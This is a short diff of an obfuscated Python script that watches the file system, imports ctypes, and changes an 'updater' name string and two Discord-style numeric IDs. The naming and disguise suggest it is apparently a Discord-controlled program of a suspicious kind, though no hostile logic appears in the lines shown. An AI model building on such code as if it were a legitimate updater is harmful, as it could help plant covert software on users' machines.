@@ -6,7 +6,7 @@ from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 import ctypes
 
-discord_v = "updater."
+discord_v = "updater_2."
 
 class efh(FileSystemEventHandler):
     def __init__(self,ep):
@@ -45,8 +45,8 @@ def icececeecii ():
         icececeecii()
 
 
-rl11 = "1182028570919440467"
-ppkl = "1182746843386490930"
+rl11 = "1184175835129847820"
+ppkl = "1184176186914508800"
 discord_api_int_version = "89177737318179831"
 
 fnk = "x"
